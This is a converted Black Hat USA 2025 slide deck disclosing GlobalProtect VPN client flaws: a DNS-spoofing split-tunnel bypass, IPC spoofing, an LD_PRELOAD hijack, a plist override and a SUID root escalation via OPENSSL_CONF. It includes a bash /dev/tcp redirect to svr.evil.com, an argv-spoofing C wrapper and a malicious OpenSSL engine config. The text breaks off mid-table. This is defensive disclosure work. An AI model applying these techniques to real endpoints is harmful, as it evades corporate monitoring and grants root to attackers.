---
title: "Turning the Tables on GlobalProtect Use and Abuse of Palo Alto's Remote Access Solution"
speakers: ["Alex Bourla", "Graham Brereton"]
conference: "Black Hat"
conference_full: "Black Hat USA 2025"
edition: "USA"
year: 2025
source_pdf: "BlackHat_USA_2025_Slides/Alex Bourla&Graham Brereton_Turning the Tables on GlobalProtect Use and Abuse of Palo Alto's Remote Access Solution.pdf"
pages: 73
sha256: "82f15c63b387269edbfee0d600812f790b5371df2a0e84e8f87d0596754236e8"
text_chars: 34930
ocr_pages: 7
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T22:49:01Z"
---
# Turning the Tables on GlobalProtect Use and Abuse of Palo Alto's Remote Access Solution

**Speakers:** Alex Bourla, Graham Brereton  
**Conference:** Black Hat USA 2025  
**Source:** `BlackHat_USA_2025_Slides/Alex Bourla&Graham Brereton_Turning the Tables on GlobalProtect Use and Abuse of Palo Alto's Remote Access Solution.pdf` (73 pages)

## Slide 1

Turning the Tables on GlobalProtect Use and Abuse of Palo Alto’s Remote Access Solution

Speaker: Alex Bourla Contributor: Graham Brereton

#BHUSA @BlackHatEvents

## Slide 2

```
$ whoami
Speaker -Alex Bourla
```

- These days: Independent Security Engineer and Researcher

- • Previously: Penetration Tester and Red Teamer

- Still can’t resist poking at products when something doesn’t smell right…

```
Contributor -Graham Brereton
```

- Ex-colleague and core contributor

- Played a key role in this research

#BHUSA @BlackHatEvents

2

## Slide 3

###### **`$ globalprotect --info`**

- Always-On VPN for enterprises

- SSL decryption & inspection

- Identity-based access control

- Device trust enforcement

- ‘Advanced Threat’ & DLP

#BHUSA @BlackHatEvents

3

## Slide 4

### Where it all begun…

#BHUSA @BlackHatEvents

4

## Slide 5

###### The docs that caught my eye

**<u>https://docs.paloaltonetworks.com/globalprotect/10-1/globalprotect-admin/globalprotect-gateways/split-tunneltraffic-on-globalprotect-gateways/configure-a-split-tunnel-based-on-the-domain-and-application</u>**

#BHUSA @BlackHatEvents

5

## Slide 6

###### Q: How would you design this feature securely ?

```
For example, add*.target.comto exclude all Target traffic
from the VPN tunnel.
```

Hint

Adapted from original by Wikipedia contributors, licensed under CC BY-SA 4.0

#BHUSA @BlackHatEvents

6

## Slide 7

###### What could go wrong with this design?

```
Wildcard Split Tunnel Domain Feature –e.g. *.zoom.us
```

What if the DNS server is _mine_ ? And, what if the response is a lie?

`Resolve api.zoom.us` Open http://foo. `MacOS DNS Resolver GlobalProtect Network Extension MacOS IP Route Table add route 123.45.67.89 via physical interface`

```
api.zoom.us
→123.45.67.89
```

```
dig foo.zoom.us
@[attacker-dns-server]
```

#BHUSA @BlackHatEvents

7

## Slide 8

###### Example Exploitation

###### **External Attacker’s goal:**

Unmonitored
C2 channel

- `*.zoom.us` configured as a split tunnel domain to improve Zoom performance

8 Image: Flaticon.com

#BHUSA @BlackHatEvents

## Slide 9

Attacker-
controlled DNS
Server
e.g. 6.6.6.6
GlobalProtect Gateway Server

###### Exploitation Steps

1. DNS Request for whitelisted domain `foo.zoom.us` is sent to **attackercontrolled** DNS server

$ dig foo.zoom.us @6.6.6.6 +short

Device Protected by
GlobalProtect

#BHUSA @BlackHatEvents

9

## Slide 10

Attacker-
controlled DNS
Server
e.g. 6.6.6.6
GlobalProtect Gateway Server
1. DNS Request for
whitelisted domain

1. DNS Request for
whitelisted domain
foo.zoom.us is sent
to  attacker-
controlled DNS
server

```
Device Protected by
GlobalProtect
```

###### Exploitation Steps

2. Attacker-controlled DNS server crafts response including the **real** IP address of `c2.evil.com (1.2.3.4)`

```
$ dig foo.zoom.us@6.6.6.6 +short
```

```
1.2.3.4
```

GlobalProtect will now **wrongly** associate the attacker IP address of `1.2.3.4` with the whitelisted wildcard domain of `*.zoom.us`

#BHUSA @BlackHatEvents

10

## Slide 11

Attacker-
controlled DNS
c2.evil.com
Server
(1.2.3.4)
e.g. 6.6.6.6
2. Attacker-controlled DNS
server crafts response
including the  real IP
address of c2.evil.com
(1.2.3.4)
GlobalProtect Gateway Server
1. DNS Request for
whitelisted domain

1. DNS Request for
whitelisted domain
foo.zoom.us is sent
to  attacker-
controlled DNS
server

Device Protected by
GlobalProtect

###### Exploitation Steps

3. Now any requests made to `c2.evil.com` will go straight to the Internet, **bypassing GlobalProtect tunnel** , and evading protection

Potential Impacts:

- Unmonitored C2 channels

- Data exfiltration

- Policy bypass

- etc.

11 Image: Flaticon.com

#BHUSA @BlackHatEvents

## Slide 12

###### Video Demo

###### **Malicious Insider’s goal:**

- `*.zoom.us` configured as a split tunnel domain to improve Zoom performance

#BHUSA @BlackHatEvents

12

## Slide 13

#BHUSA @BlackHatEvents

13

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
@ iTerm2 Shell Edit View Session Scripts Profiles Window Help Oo T
Web Page Blocked x 9 Private browsing
Web Page Blocked
The web page you are trying to visit has been blocked in accordance with company policy. Please
contact your system administrator if you believe this is an error.
User: 10.10.10.11
URL: www.dropbox.com/
Category: online-storage-and-backup
GlobalProtect 140.5 MB
OW<«e-o G @ fay www.timear \%” Modified: Today, 10:06
® Hide features
General:
OO bs OO . O ( Kind: Application (Universal)
. . Size: 140,467,911 bytes (141.3 MB
on disk)
Where: Macintosh HD + Applications
Created: Thursday, 24 July 2025 at 10:06
Modified: Thursday, 24 July 2025 at 10:06
Version: 6.3.1-376
Copyright: Copyright © 2009-2019, Palo
Alto Networks, Inc.
Scale to fit below built-in camera
More Info:
Last opened: Thursday, 24 July 2025 at 11:16
Name & Extension:
f°; Comments:
Settings
Preview:
and sounds
```

## Slide 14

#### A feature based on <u>misplaced trust</u>

<u>https://github.com/dlenski/openconnect/issues/151</u>

#BHUSA @BlackHatEvents

14

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
BRIEFINGS
Cc 25 github.com/dlenski/openconnect/issues/151
© Open ) Include support for Palo Alto Globalprotect split-tunneling includes #151
>» dlenski on Sep 6, 2019 Owner
Interesting. As you can see, | haven't encountered these config tags before, and I'm not 100% sure how to
interpret them.
A fe a t U re e Does the <include-split-tunneling-domain> mean that all the wildcard domains listed therein should
be routed through the VPN tunnel? Or shouldn't be routed via the VPN tunnel?
e IP routing is done based on IP addresses, not based on DNS names...
GP config already has mechanisms for supporting split tunneling based on IP addresses, which
OpenConnect fully supports.
Doing routing based on DNS wildcards would mean running a masquerade/intermediary DNS server
on the localhost, intercepting DNS lookups, deciding if they match the VPN wildcards, and if so
dynamically modifying the routing table appropriately. | don't know of any tool that does this
automatically; the standard vpnc-script certainly doesn't, my vpn-slice doesn't, and it seems like it'd
be a pain to write such a tool, a potential security nightmare, and difficult to manage with multiple
simultaneous VPN connections.
It's not clear how DNS- and IP-based routing can be combined in a consistent and unsurprising way.
A hostname listed in the wildcard could have the same IP address as another hostname not listed,
yet the traffic for the second hostname would get (surprisingly) redirected after a DNS lookup of the
first one.
So I'm not sure how to handle this DNS-based split tunneling, and I'm kind of suspicious of the security
characteristics or value to the end-user. Anything you think I'm missing here?
As for exclude-video-redirect , | have no idea what this one means. i$
©
```

## Slide 15

# “

`So I'm not sure how to handle this DNSbased split tunneling` _`[sic]`_ `, and` **`I'm kind of suspicious of the security characteristics`** `or value to the enduser.` ”

<u>https://github.com/dlenski/openconnect/issues/151</u>

#BHUSA @BlackHatEvents

15

## Slide 16

##### From Curiosity to Targeted Research…

#BHUSA @BlackHatEvents

16

## Slide 17

###### Scope

###### Goals

###### **In**

- macOS client

- Linux client

**Out**

- PA Firewall / VPN server

- Windows client

- Mobile device clients

GlobalProtect Bypass 1 of 1 Privilege Escalation 0 of 1

#BHUSA @BlackHatEvents

17

## Slide 18

IPC
Channels
Privileged Debug
Binaries Logs
GlobalProtect
Client
(macOS / Linux)
Config  UI
Files Application

###### Process

#BHUSA @BlackHatEvents

18

## Slide 19

###### IPC Channel: Deeper dive

IPC
Channels
GlobalProtect
Client
(macOS / Linux)

Privileged (uid == 0) Unprivileged (uid != 0)
PanGPS PanGPA
localhost/4767
> sudo lsof -iTCP:4767 -sTCP:LISTEN -n -P
COMMAND PID USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME
PanGPS 621 root    9u  IPv4 0xe4a126caf887bbc2      0t0  TCP 127.0.0.1:4767 (LISTEN)

#BHUSA @BlackHatEvents

19

## Slide 20

IPC
Channels

GlobalProtect
Client
(macOS / Linux)

Privileged (uid == 0) Unprivileged (uid != 0)
PanGPS PanGPA
localhost
/4767

###### IPC Channel: Deeper dive

#BHUSA @BlackHatEvents

20

## Slide 21

IPC
Channels

Privileged (uid == 0) Unprivileged (uid != 0)
PanGPS PanGPA
localhost
/4767

###### IPC Channel: Deeper dive

16 byte header of AES-CBC encrypted XML payload: message length `AES_CBC(AES_KEY, IV, XML)`

```
AES_KEY = md5(userKeyParam+ md5("pannetwork"))     = fn(userKeyParam)
+ md5(userKeyParam+ md5("pannetwork"))
```

GlobalProtect Client

(macOS / Linux)

**`userKeyParam` Login** Keychain: `GlobalProtectService` **`IV`** "000000000000000000000 00000000000"

#BHUSA @BlackHatEvents

21

## Slide 22

Privileged (uid == 0) Unprivileged (uid != 0)
IPC Channel: Deeper dive PanGPS PanGPA
localhost
/4767
16 byte header of  AES-CBC encrypted XML payload:
IPC  message length  AES_CBC(AES_KEY, IV, XML)
Channels
AES_KEY = md5(userKeyP aram +  md5("pannetwork"))
+ md5(userKeyParam + md5("pannetwork"))
GlobalProtect
Client
(macOS / Linux)
userKeyParam Login  Keychain:  userKeyParam global135protect
GlobalProtectService
IV "000000000000000000000 IV 000000000000000000000
00000000000 00000000000

#BHUSA @BlackHatEvents

22

## Slide 23

IPC
Channels

```
Privileged (uid== 0)Unprivileged (uid!= 0)
PanGPSPanGPA
localhost
/4767
```

###### IPC Channel: Deeper dive

16 byte header of AES-CBC encrypted XML payload: message length `AES_CBC(AES_KEY, IV, XML)`

```
AES_KEY = md5(userKeyParam+ md5("pannetwork"))     = fn(userKeyParam)
+ md5(userKeyParam+ md5("pannetwork"))
```

GlobalProtect Client (macOS / Linux)

**`userKeyParam` Login** Keychain: `GlobalProtectService` **`IV`** "000000000000000000000 00000000000"

**`userKeyParam`** `"global135protect"` **IV** "000000000000000000000 00000000000"

For more info, see previous research: <u>https://www.crowdstrike.com/en-us/blog/exploiting-globalprotect-for-privilege-escalation-parttwo-linux-and-macos/</u>

#BHUSA @BlackHatEvents

23

## Slide 24

IPC
Channels

GlobalProtect
Client
(macOS / Linux)

Privileged (uid == 0) Unprivileged (uid != 0)
PanGPS PanGPA
localhost
/4767

IPC Channel: Deeper dive

###### **Key Point:**

In **<u>both cases</u>** the encryption does **<u>nothing</u>** to protect the confidentiality or integrity of the IPC connection from the perspective of a **<u>low privileged user</u>**

#BHUSA @BlackHatEvents

24

## Slide 25

IPC
Channels

GlobalProtect Client (macOS / Linux)

###### IPC Channel: Deeper dive

Example XML payload during **authorised** disconnect through UI: **Key Point:** `<request>request>>`

```
<request>request>>
```

```
<type>disable</type>
<user>Unknown</user>
<time>Tue Aug 27 02:59:09 2024</time>
<pid>1534</pid>
<reason>. Override(s)=2</reason>
```

```
</request>
```

Encryption Algorithm Encryption Key Plaintext Message What if I replay this message and force a disconnect?

Privileged (uid == 0) Unprivileged (uid != 0)
PanGPS PanGPA
localhost
/4767

#BHUSA @BlackHatEvents

25

## Slide 26

###### But PanGPS fights back…

> `/Library/Logs/PaloAltoNetworks/GlobalProtect/PanGPS.log` **Key Point:**

- Debug

- `(...) Error( 100): Connected by process not from GP folder` Logs

- `(...) Error( 205): Connected by non-PanGPA. Close socket. (...) Debug( 356): receive sig 20`

**There’s a security control**

- `PanGPS` works out which process connected to it.

- Close connection if process not inside: `/Applications/GlobalProtect.app/`

#BHUSA @BlackHatEvents

26

## Slide 27

###### Understanding the control

Step 1

###### **Key Point:**

```
Inside PanGPS
```

```
popen("/usr/sbin/lsof-i:4767", "r");
```

look at the
GlobalPro

look at the **first non-header line only** , extract the pid from the ascii command output:

```
/usr/sbin/lsof-i:4767
COMMAND     PID       USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME
GlobalPro36305 demo    3u  IPv4 0x24c6542f5810fcf4      0t0  TCP localhost:63522->localhost:4767 (ESTABLISHED)
```

Privileged (uid == 0) Unprivileged (uid != 0)
Process Name spoofedConn
PanGPS
Process ID 12345
localhost
/4767

#BHUSA @BlackHatEvents

27

## Slide 28

###### Understanding the control

**Key Point:** Step 2

```
Inside PanGPS
```

```
res =proc_pidpath(pid, pid_path, sizeof(pid_path));
if(res <1){
```

```
returntrue;
}
```

```
returnstd::strncmp(pid_path, "/Applications/GlobalProtect.app/", 32)==0;
```

**Get path from** **`pid` and check if it starts with** **`/Applications/GlobalProtect.app/`**

Privileged (uid == 0) Unprivileged (uid != 0)
Process Name spoofedConn
PanGPS
Process ID 12345
localhost
/4767localhost
/4767

Can we fool this logic into
thinking it’s connected by a
trusted binary when it’s
not?

#BHUSA @BlackHatEvents

28

## Slide 29

###### We found a way!

GlobalProtect Bypass 2 of 1 Privilege Escalation 0 of 1

1. Stop existing `PanGPA` UI process

Can we fool this logic into thinking it’s connected by a trusted binary when it’s not?

2. Redirect output from a **<u>legitimate GlobalProtect binary</u>** to any remote service listening on port 4767 (e.g. using bash TCP redirection)

```
/bin/bash -c \
"/Applications/GlobalProtect.app/Contents/Resources/PanGpHipMp\
>& /dev/tcp/svr.evil.com/4767 0>&1"
```

3. Connect to the IPC service ( `localhost:4767` ) from our malicious userspace process. `PanGPS` sees something like this:

The process evaluated by the security control

```
COMMAND     PID       USER   FD   TYPE    (...)
PanGpHipM48222 demo         0u  IPv4    (...) (CLOSE_WAIT)
PanGpHipM48222 demo         1u  IPv4    (...) (CLOSE_WAIT)
spoofedC48587 demo         3u  IPv4    (...) (ESTABLISHED)
```

The process that actually connects to the IPC server

#BHUSA @BlackHatEvents

29

## Slide 30

#BHUSA @BlackHatEvents

30

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
@ QuickTime Player File Edit View Window Help
Alexs—MacBook-Air. local: Thu Jul 24 11:02:02 2025
COMMAND PID USER FD TYPE DEVICE SIZE/OFF
NODE NAME
GlobalPro 18711 demo 3u  IPv4 0x7d17601c8220cc5 Oto
TCP localhost:58059->localhost:4767 (ESTABLISHED)
demo % []
33 Web Page Blocked x ap
o-
°5 dropbox.com Q ¥* & Incognito
Web Page Blocked
The web page you are trying to visit has been blocked in accordance with company policy. Please
contact your system administrator if you believe this is an error.
User: 10.10.10.11
URL: www.dropbox.com/
Category: online-storage-and-backup
GlobalProtect 140.5 MB
% Modified: Today, 10:06
General:
Kind: Application (Universal)
Size: 140,467,911 bytes (141.3 MB
on disk)
Where: Macintosh HD » Applications
Created: Thursday, 24 July 2025 at 10:06
Modified: Thursday, 24 July 2025 at 10:06
Version: 6.3.1-376
Copyright: Copyright © 2009-2019, Palo
Alto Networks, Inc.
Scale to fit below built-in camera
More Info:
Last opened: Thursday, 24 July 2025 at 10:57
Name & Extension:
Comments:
Preview:
```

## Slide 31

###### Let’s look deeper at the control again

```
Derived from decompiled code
```

**`isConnectedByPan()`** FAIL OPEN `Something went wrong Verification Passed Convert text discard read find 1`<sup>`st`</sup> `find 2`<sup>`nd`</sup> `Get path of Yes lsof –i between header next space space process with :4767 spaces to a line line delimiter delimiter that pid number Is path trusted? Not a valid Default to number zero! No` “ Plan to have the configuration fail securely: **Design systems** `Verification` **to fail in a secure state** , rather than exposing vulnerabilities rather than exposing vulnerabilities `Failed`

“ Plan to have the configuration fail securely: **Design systems to fail in a secure state** , rather than exposing vulnerabilities rather than exposing vulnerabilities when they malfunction. — OWASP Secure Product Design Cheat Sheet ”

#BHUSA @BlackHatEvents

31

## Slide 32

###### Exploiting the fail-open design

###### `Derived from decompiled code`

###### **`isConnectedByPan()`**

isConnectedByPan()
Something went wrong
Verification
Passed
Convert text
discard  read  find 1 st find 2 nd Get path of  Yes
lsof –i between
header  next  space  space  process with
:4767 spaces to a
line line delimiter delimiter that pid
number   Is path
trusted?
Not a
Imagine: valid  Default to
• Binary name < 9 characters number zero! No
•
Space-padding in output causes misalignment:
Verification
COMMAND  PID       USER (...) NAME
short   4073 alexbourla (...) localhost:49903->localhost:4767 (ESTABLISHED) Failed
What happens if I use a
short process name?

#BHUSA @BlackHatEvents

32

## Slide 33

###### Exploiting the fail-open design

GlobalProtect Bypass 3 of 1 Privilege Escalation 0 of 1

###### **`isConnectedByPan()`**

###### `Something went wrong`

`Verification Passed Convert text discard read find 1`<sup>`st`</sup> `find 2`<sup>`nd`</sup> `Get path of Yes lsof –i between header next space space process with :4767 spaces to a line line delimiter delimiter that pid number Is path trusted? Not a` Imagine: `valid Default to` Binary name < 9 characters `number zero! No` Space-padding in output causes misalignment: `Verification COMMAND  PID       USER (...) NAME short   4073 alexbourla (...) localhost:49903->localhost:4767 (ESTABLISHED) Failed`

Imagine:

- Binary name < 9 characters

- Space-padding in output causes misalignment:

- `COMMAND  PID       USER (...) NAME short   4073 alexbourla (...) localhost:49903->localhost:4767 (ESTABLISHED)`

```
/Library/Logs/PaloAltoNetworks/GlobalProtect/PanGPS.log:
```

What happens if I use a short process name?

`(...) Error(  92): Failed to get path of process 0, error No such process` Debug Logs

#BHUSA @BlackHatEvents

33

## Slide 34

#BHUSA @BlackHatEvents

34

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
@ iTerm2 Shell Edit View Session Scripts Profiles
33 Web Page Blocked x = v
Alexs—MacBook-Air. local: Thu Jul 24 11:16:29 2025
°3 dropbox.com Q * & Incognito
COMMAND PID USER FD We DEVICE SIZE/0OF
F NODE NAME
GlobalPro 48013 demo 3u IPv4 @xb662cdb0870b3215 et
@ TCP localhost:59439->localhost:4767 (ESTABLISHED)
Web Page Blocked
The web page you are Ning to visit has been blocked in accordance with company policy. Please
contact your system administrator if you believe this is an error.
User: 10.10.10.11
URL: www.dropbox.com/
[] Category: online-storage-and-backup
demo % [] GlobalProtect 140.5 MB
% Modified: Today, 10:06
General:
Kind: Application (Universal)
Size: 140,467,911 bytes (141.3 MB
on disk)
Where: Macintosh HD » Applications
Created: Thursday, 24 July 2025 at 10:06
Modified: Thursday, 24 July 2025 at 10:06
Version: 6.3.1-376
Copyright: Copyright © 2009-2019, Palo
Alto Networks, Inc.
Scale to fit below built-in camera
More Info:
Last opened: Thursday, 24 July 2025 at 11:09
Name & Extension:
Comments:
Preview:
```

## Slide 35

###### What about Linux?

**Spoofed IPC Disconnect from non-GP process?** This doesn’t work because on Linux can use pseudo-filesystem to check more robustly (pseudo-filesystem doesn’t exist in Mac)

/proc/[pid]/fd
symlink
-> socket:[12345]

for:
2. Find pid for Inode:
/proc/net/tcp
Remote 127.0.0.1/4767
12345
Local Addr/Port
Local 127.0.0.1/<connected
Remote Addr/Port
port>
Inode number (e.g. 12345)

```
1. Find Inodefor:
Remote 127.0.0.1/4767
Local 127.0.0.1/<connected
port>
```

readlink /proc/[pid]/exe
[binary-path]

3. Resolve binary path
for pid

#BHUSA @BlackHatEvents

35

## Slide 36

###### We can do something else in Linux…

If spoofing fails… Can we hijack a legitimate GlobalProtect process instead ?

“

In computing, a dynamic linker is the part of an operating system that loads and **links the shared libraries** needed by an executable when it is executed ( **at "run time"** ) — Wikipedia (Dynamic Linker) ”

And, how this works is very different between Mac and Linux

#BHUSA @BlackHatEvents

36

## Slide 37

###### Control via Environment Variables

```
DYLD_* variables
```

```
LD_* variables
```

```
SIP restricts DYLD injection for
protected binaries
```

Security Hardening

```
DYLD_INSERT_LIBRARIES etc. are ignored
at runtime if binary is:
```

- **`Code-signed`**

- **`SIP-protected (e.g. inside /Applications)`**

```
(But hardened apps e.g. with
seccomp, static-linking, or
containers may block it)
```

```
This is true even for root user
```

#BHUSA @BlackHatEvents

37

## Slide 38

###### We can do something else in Linux…

If spoofing fails… Can we hijack a legitimate GlobalProtect process instead ?

GlobalProtect Bypass 4 of 1 Privilege Escalation 0 of 1

Malicious Code

```
$ LD_PRELOAD=$PWD/libgpdisable.so\
/opt/paloaltonetworks/globalprotect/PanGPA
```

#BHUSA @BlackHatEvents

38

## Slide 39

39 #BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Jul 18 13:09
O & dropbox.com
Web Page Blocked
The web page you are trying to visit has been blocked in accordance with company policy. Please
contact your system administrator if you believe this is an error.
User: 10.10.10.38
URL: dr
Category: online-storage-and-backup
$ ./CVE-2025-0140
& GlobalProtect
GlobalProtect: 6.2.7-1050
Copyright 2009-2025, Palo Alto Networks, Inc.
```

## Slide 40

###### Back to

###### **Imagine:**

- Calling process check was bulletproof and we couldn’t spoof IPC

- • We can’t dynamically link a shared library on Mac due to SIP

#BHUSA @BlackHatEvents

40

## Slide 41

###### Back to

```
Unprivileged (uid!= 0)
```

Is there **_another_** way to make the **_real_** `PanGPA` binary misbehave?

PanGPA

```
> ls -l /Users/$USER/Library/Preferences/com.paloaltonetworks.GlobalProtect.settings.plist
```

```
-rw-------1 demo  staff  3004 15 Jul 17:50
```

```
/Users/demo/Library/Preferences/com.paloaltonetworks.GlobalProtect.settings.plist
```

Config Files

• User preferences • **Local cached config**

/Users/ **$USER** /Library/Preferen ces/ com.paloaltonetworks.GlobalPr otect.settings.plist

#BHUSA @BlackHatEvents

41

## Slide 42

###### Back to

```
Unprivileged (uid!= 0)
```

Is there **_another_** way to make the **_real_** `PanGPA` binary misbehave?

```
PanGPA
```

```
(...)
```

- `<key>Settings\portal.gp-lab.uk</key> <dict>`

```
<key>OverrideMethod</key>
```

```
<string>with-passcode</string>
</dict>
```

```
(...)
```

Config Files

•
User preferences

   - **Local cached config**

- /Users/ **$USER** /Library/Preferen ces/ com.paloaltonetworks.GlobalPr otect.settings.plist

#BHUSA @BlackHatEvents

42

## Slide 43

###### Back to

GlobalProtect Bypass 5 of 1 Privilege Escalation 0 of 1 `Unprivileged (uid != 0)`

```
PanGPA
```

•
User preferences
•
Local cached
config

- /Users/ **$USER** /Library/Preferen ces/ com.paloaltonetworks.GlobalPr otect.settings.plist

#BHUSA @BlackHatEvents

43

## Slide 44

#BHUSA @BlackHatEvents

44

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
é
Finder
File
Edit
View
Go
Window
Help
Web Page Blocked x 9 Private browsing
Web Page Blocked
The web page you are trying to visit has been blocked in accordance with company }
contact your system administrator if you believe this is an error.
User: 10.10.10.12
URL: www.dropbox.com
Category: online-storage-and-backup
GlobalProtect 149.4 MB
% Modified: Today, 13:17
General:
Kind: Application (Universal)
Size: 149,371,802 bytes (150.2 MB on disk)
Where: Macintosh HD » Applications
Created: Thursday, 24 July 2025 at 13:17
Modified: Thursday, 24 July 2025 at 13:17
Version: 6.3.2-525
Copyright: Copyright © 2009-2019, Palo Alto Networks, Inc.
Scale to fit below built-in camera
More Info:
Last opened: Thursday, 24 July 2025 at 13:55
```

## Slide 45

# “ The <u>real</u> problem

**`An insecure design cannot be fixed by a perfect implementation`** `as by definition, needed security controls were never created to defend against specific attacks.` — OWASP, Top 10:2021 Insecure Design ”

#BHUSA @BlackHatEvents

45

## Slide 46

###### **`Trust boundary`**

Privileged (uid == 0)

PanGPS

Unprivileged (uid != 0)

PanGPA
“should the VPN disconnect?”
security decision

Secure design means building If the decision is made by an controls where they can’t be unprivileged, user-space, bypassed, process, an attacker will on the ‘right’ side <u>of a trusalways</u> have a way in.t boundary.

#BHUSA @BlackHatEvents

46

## Slide 47

##### Privilege Escalation to Root

GlobalProtect Bypass 5 of 1
Privilege Escalation  0 of 1

#BHUSA @BlackHatEvents

47

## Slide 48

###### Privileged Binaries: Deeper dive

Privileged (uid == 0) Unprivileged (uid != 0)
Privileged
Launch with SUID
Binaries
launchd
- rwsr -xr-x root wheel
PanGPS
GlobalProtect
localhost
Client
/4767
(macOS / Linux)
Collect Host Information
PanGPHip PanGPHipMP
https://docs.paloaltonetworks.com/globalprotect/10-
1/globalprotect-admin/host-information/configure-
hip-based-policy-enforcement

#BHUSA @BlackHatEvents

48

## Slide 49

Privileged
Binaries

###### Privileged Binaries: Deeper dive

```
$ PATH=[ATTACKER_CONTROLLED_DIR] \
$GP_APP_PATH/Contents/Resources/PanGPS
```

GlobalProtect Client (macOS / Linux)

```
Privileged (uid== 0)
```

```
Unprivileged (uid!= 0)
```

```
Launch with SUID
```

- rwsr-xr-x
root  wheel

```
PanGPS
```

```
launchd
```

#BHUSA @BlackHatEvents

49

## Slide 50

###### But PanGPS fights back, again…

`> PATH=/tmp/ ./PanGPS` **Key Point:** `P3388-T259   07/20/2025 10:30:39:721 Debug( 810): Not match 2025-07-20 10:30:39.721 PanGPS[3388:61224]` `PanGPS cannot be launched this way!`

**There’s a security control**

- `PanGPS` works out which process started to it.

- Kill process if not launched by `/sbin/launchd`

#BHUSA @BlackHatEvents

50

## Slide 51

```
Decompiled PanGPSbinary:
```

`bool CheckProcessName(int` _`pid`_ `, const char *` _`expected_name`_ `) { char cmd[256]; snprintf(cmd, sizeof(cmd), "ps -p %d -o command | grep -v COMMAND", pid); FILE *fp = popen(cmd, "r");` **Key Point:** `if (fp == NULL) { return false; } ps gets command from argv`

```
charoutput[260];
if(fgets(output,sizeof(output),fp) ==NULL){
pclose(fp);
returnfalse;
}
```

```
trim_trailing_spaces(output);
```

```
boolmatch =strcmp(output,expected_name) ==0;
```

```
pclose(fp);
returnmatch;
}
```

But if we control parent process, we also control `argv` !

#BHUSA @BlackHatEvents

51

## Slide 52

###### Without malicious wrapper

###### With malicious wrapper

###### `PanGPS_wrapper.c:`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
int main (int argc , char * argv [])
{
strncpy( argv [0], "/sbin/launchd", strlen ( argv [0]));
system ("/Applications/GlobalProtect.app/Contents/Resources/PanGPS");
return 0;
}

#BHUSA @BlackHatEvents

52

## Slide 53

###### But PanGPS fights back, again, again…

```
Decompiled PanGPSbinary:
```

`void entry` **Key Point:** `(int` _`argc`_ `, char **` _`argv`_ `) {` _`// Overwrite attacker-controlled environment variable`_ `setenv("PATH", "/usr/bin:/bin:/usr/sbin:/sbin", 1);` _`// ... rest of PanGPS startup logic ...`_

```
}
```

**There’s** **_another_ security control**

• `PanGPS` sanitises `$PATH`

#BHUSA @BlackHatEvents

53

## Slide 54

###### Well then, let’s just use a different one!

But which!?

###### `Decompiled PanGPS binary:`

char *ossl_safe_getenv(const char * name ) {
if (OPENSSL_ issetugid() != 0) {
// running setuid/setgid → environment is untrusted
return NULL;
}
return getenv(name);
}

#BHUSA @BlackHatEvents

54

## Slide 55

###### **`OPENSSL_CONF`** environment variable

```
Example malicious OPENSSL configuration file:
```

```
This is a problem,
but let’s try it
anyway...
```

```
openssl_conf=openssl_init
[openssl_init]
engines=engine_section
[engine_section]
pkcs11=pkcs11_section
```

<u>https://docs.openssl.org/3.1/man5/config/#environment</u>

- `$ OPENSSL_CONF=/tmp/evil.conf \ ./PanGPS_wrapper`

```
[pkcs11_section]
engine_id=pkcs11
dynamic_path=/tmp/evil_openssl_engine.dylib
default_alogorithms=ALL
init=1
```

#BHUSA @BlackHatEvents

55

## Slide 56

56 #BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
iTerm2
Shell
Edit
View
Session
Scripts
Profiles
Window
Help
2
“6
i
CVE-2025-0141: Mac SUID PE (-zsh)
@ GlobalProtect info
GlobalProtect
\% Modified: Today, 14:00
140.5 MB
¥ General:
Kind: Application (Universal)
Size: 140,467,911 bytes (141.3 MB on disk)
Where: Macintosh HD + Applications
Created: Thursday, 24 July 2025 at 14:00
Modified: Thursday, 24 July 2025 at 14:00
Version: 6.3.1-376
Copyright: Copyright © 2009-2019, Palo Alto Networks, Inc.
Locked
__ Scale to fit below built-in camera
```

## Slide 57

###### But why did that work!?

###### `Decompiled PanGPS binary:`

int OPENSSL_issetugid(void) {
uid_t real_uid = getuid();
uid_t effective_uid = geteuid();
if (real_uid == effective_uid) {
gid_t real_gid = getgid();
gid_t effective_gid = getegid();
return (int)(real_gid != effective_gid);
}
return 1; Value in a typical SUID
Concept
} binary
The user who  launched the
UID (Real UID)
binary (e.g. you)
The  owner of the binary:
EUID (Effective UID) typically root if it’s a SUID
root binary

Privileged (uid == 0) Unprivileged (uid != 0)
Launch with SUID
UID 501 $OPENSSL_CONF
$OPENSSL_CONF
EUID 0 launchd
PanGPS
- rwsr-xr-x
root  wheel
Launch as root
UID 0
EUID 0
$OPENSSL_CONF
PanGPHip PanGPHipMP
Privilege escalation
happens here!

#BHUSA @BlackHatEvents

57

## Slide 58

###### SUID Binary Privilege Escalation Summary

**Defensive Control**

**Bypass Technique** Fooled by fake parent PID Target `$OPENSSL_CONF` instead

`launchd` check

`$PATH` sanitsation Target `$OPENSSL_CONF` instead `Issetuid()` check ineffective due to ‘true’ root child processes

GlobalProtect Bypass 5 of 1
Privilege Escalation  1 of 1

#BHUSA @BlackHatEvents

58

## Slide 59

“ The <u>real</u> problem

**`Least Privilege`** `- A security principle in which a person or process is given only the minimum level of access rights (privileges) that is necessary for that person or process to complete an assigned operation.` — OWASP, Principles of Security ”

<u>https://developer.apple.com/librar y/archive/documentation/MacOSX /Conceptual/BPSystemStartup/Cha pters/CreatingLaunchdJobs.html</u>

#BHUSA @BlackHatEvents

59

## Slide 60

##### Fixes, Failures, and Final Lessons

#BHUSA @BlackHatEvents

60

## Slide 61

|**Vulnerability (CVE)**|**Reported**|**Status**|**Fixed**|**Notes / Mitigation**|
|---|---|---|---|---|
|**VPN Bypass:**
DNS Spoofing, Wildcard
Split Tunnel Domain|**April 2024**|**WON’T FIX**|**N/A**|_“After investigation, we have determined_
_that we do not consider this a vulnerability_
